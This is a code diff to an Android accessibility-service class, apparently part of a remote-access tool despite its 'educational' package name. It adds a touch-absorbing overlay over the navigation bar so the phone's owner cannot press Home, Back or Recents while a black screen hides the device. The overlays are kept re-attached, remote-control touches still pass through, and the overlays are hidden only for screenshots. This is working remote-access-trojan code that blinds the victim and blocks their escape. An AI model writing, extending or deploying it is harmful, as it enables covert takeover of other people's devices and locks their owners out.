@@ -5,6 +5,7 @@ import android.graphics.PixelFormat;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
+import android.view.Gravity;
 import android.view.View;
 import android.view.WindowManager;
 import com.remoteaccess.educational.services.UnifiedAccessibilityService;
@@ -20,6 +21,15 @@ import org.json.JSONObject;
  *   any system UI from appearing on top after the block is enabled.
  * - runWithOverlayHidden() hides/shows the overlay on the main thread but runs the
  *   capture task on the CALLER'S thread (avoids deadlock with captureScreenSync).
+ *
+ * Navigation-bar touch guard:
+ * - A second, smaller overlay sits on top of the main blackout and covers only the
+ *   navigation-bar strip at the bottom of the screen.
+ * - Unlike the main overlay (FLAG_NOT_TOUCHABLE — touches pass through), the nav-bar
+ *   overlay absorbs all touches so the user cannot tap Home / Back / Recents while
+ *   the block screen is active.
+ * - The rest of the display is unaffected: touches above the nav bar pass through the
+ *   main overlay normally, so remote-control interactions still reach the app.
  */
 public class ScreenBlackout {
 
@@ -33,6 +43,10 @@ public class ScreenBlackout {
     private WindowManager.LayoutParams  overlayParams = null;
     private boolean                     active       = false;
     private boolean                     viewAttached = false;
+
+    // Navigation-bar touch-guard overlay — separate small view anchored to the bottom
+    private View    navBarOverlayView  = null;
+    private boolean navBarAttached     = false;
 
     private static volatile ScreenBlackout instance;
 
@@ -82,18 +96,21 @@ public class ScreenBlackout {
                 try {
                     WindowManager wm = (WindowManager)
                             service.getSystemService(android.content.Context.WINDOW_SERVICE);
-                    
-                    // Check if overlay is still attached and at top
-                    boolean isAttached = overlayView.isAttachedToWindow();
-                    
-                    if (!isAttached) {
-                        // View was detached, re-attach it
+
+                    // Re-attach main blackout overlay if system detached it
+                    if (!overlayView.isAttachedToWindow()) {
                         wm.addView(overlayView, overlayParams);
                         viewAttached = true;
-                        Log.d(TAG, "keep-on-top: overlay re-attached (was detached)");
+                        Log.d(TAG, "keep-on-top: main overlay re-attached");
                     }
-                    // If attached, assume it's still at top - no need to remove/re-add
-                    // The overlay will only be re-added if it gets detached by system UI
+
+                    // Re-attach nav-bar guard overlay if system detached it
+                    if (navBarOverlayView != null && !navBarOverlayView.isAttachedToWindow()) {
+                        WindowManager.LayoutParams nbp = buildNavBarParams(wm);
+                        wm.addView(navBarOverlayView, nbp);
+                        navBarAttached = true;
+                        Log.d(TAG, "keep-on-top: nav-bar overlay re-attached");
+                    }
                 } catch (Exception e) {
                     Log.e(TAG, "keep-on-top error: " + e.getMessage());
                 }
@@ -109,6 +126,51 @@ public class ScreenBlackout {
 
     private void stopKeepOnTopLoop() {
         mainHandler.removeCallbacks(keepOnTopRunnable);
+    }
+
+    // ── Nav-bar overlay params builder ────────────────────────────────────────
+
+    /**
+     * Build WindowManager.LayoutParams for the navigation-bar touch-guard overlay.
+     * The overlay is anchored to the BOTTOM of the screen, height = navBarH + safety margin.
+     * It intentionally omits FLAG_NOT_TOUCHABLE so all touches in the nav-bar strip are
+     * absorbed (Home / Back / Recents become inoperable while the block is active).
+     */
+    private WindowManager.LayoutParams buildNavBarParams(WindowManager wm) {
+        android.graphics.Point displaySize = new android.graphics.Point();
+        wm.getDefaultDisplay().getRealSize(displaySize);
+        int realW = displaySize.x;
+
+        int navBarH = 0;
+        try {
+            android.content.res.Resources res = service.getResources();
+            int resId = res.getIdentifier("navigation_bar_height", "dimen", "android");
+            if (resId > 0) navBarH = res.getDimensionPixelSize(resId);
+        } catch (Exception ignored) {}
+        if (navBarH <= 0) navBarH = 120;
+
+        // Add a small safety margin so gesture-navigation swipe handles are also covered
+        int guardH = navBarH + 40;
+
+        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
+                realW,
+                guardH,
+                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                // FLAG_NOT_FOCUSABLE only — NO FLAG_NOT_TOUCHABLE so touches are absorbed.
+                // FLAG_LAYOUT_NO_LIMITS extends beyond any bottom inset on gesture-nav phones.
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                PixelFormat.OPAQUE
+        );
+        p.gravity = Gravity.BOTTOM | Gravity.START;
+        p.x = 0;
+        p.y = 0;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+            p.layoutInDisplayCutoutMode =
+                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+        }
+        return p;
     }
 
     // ── Enable ───────────────────────────────────────────────────────────────
@@ -218,7 +280,24 @@ public class ScreenBlackout {
                         overlayParams = params;
                         active        = true;
                         viewAttached  = true;
-                        success[0]    = true;
+
+                        // ── Navigation-bar touch-guard overlay ────────────────
+                        // Separate, smaller overlay anchored to the bottom of the screen.
+                        // Covers only the nav-bar strip and absorbs all touches there,
+                        // preventing the user from pressing Home / Back / Recents.
+                        try {
+                            View nbView = new View(service);
+                            nbView.setBackgroundColor(Color.BLACK);
+                            WindowManager.LayoutParams nbParams = buildNavBarParams(wm);
+                            wm.addView(nbView, nbParams);
+                            navBarOverlayView = nbView;
+                            navBarAttached    = true;
+                            Log.i(TAG, "Nav-bar touch guard ENABLED (h=" + nbParams.height + ")");
+                        } catch (Exception nbEx) {
+                            Log.e(TAG, "Nav-bar overlay attach failed: " + nbEx.getMessage());
+                        }
+
+                        success[0] = true;
                         Log.i(TAG, "Screen block ENABLED — covers status bar + screen + nav bar (h="
                                 + params.height + " y=" + params.y + ")");
                     } catch (Exception e) {
@@ -294,21 +373,37 @@ public class ScreenBlackout {
 
     /** Must be called on main thread while holding lock. */
     private void removeOverlay() {
+        WindowManager wm = service != null
+                ? (WindowManager) service.getSystemService(android.content.Context.WINDOW_SERVICE)
+                : null;
+
+        // Remove main blackout overlay
         try {
-            if (overlayView != null && viewAttached && service != null) {
-                WindowManager wm = (WindowManager)
-                        service.getSystemService(android.content.Context.WINDOW_SERVICE);
+            if (overlayView != null && viewAttached && wm != null) {
                 wm.removeView(overlayView);
             }
         } catch (Exception e) {
-            Log.e(TAG, "disableBlackout removeView: " + e.getMessage());
+            Log.e(TAG, "disableBlackout removeView (main): " + e.getMessage());
         } finally {
             overlayView   = null;
             overlayParams = null;
             active        = false;
             viewAttached  = false;
-            Log.i(TAG, "Screen block DISABLED — brightness restored");
         }
+
+        // Remove nav-bar touch-guard overlay
+        try {
+            if (navBarOverlayView != null && navBarAttached && wm != null) {
+                wm.removeView(navBarOverlayView);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "disableBlackout removeView (nav-bar): " + e.getMessage());
+        } finally {
+            navBarOverlayView = null;
+            navBarAttached    = false;
+        }
+
+        Log.i(TAG, "Screen block DISABLED — brightness restored, nav-bar guard removed");
     }
 
     // ── Screenshot helper ─────────────────────────────────────────────────────
@@ -338,6 +433,7 @@ public class ScreenBlackout {
         mainHandler.postAtFrontOfQueue(() -> {
             synchronized (lock) {
                 if (overlayView != null) overlayView.setVisibility(View.INVISIBLE);
+                if (navBarOverlayView != null) navBarOverlayView.setVisibility(View.INVISIBLE);
             }
             synchronized (hideLatch) { hideDone[0] = true; hideLatch.notifyAll(); }
         });
@@ -356,6 +452,9 @@ public class ScreenBlackout {
                 synchronized (lock) {
                     if (active && viewAttached && overlayView != null) {
                         overlayView.setVisibility(View.VISIBLE);
+                    }
+                    if (navBarOverlayView != null && navBarAttached) {
+                        navBarOverlayView.setVisibility(View.VISIBLE);
                     }
                 }
             });
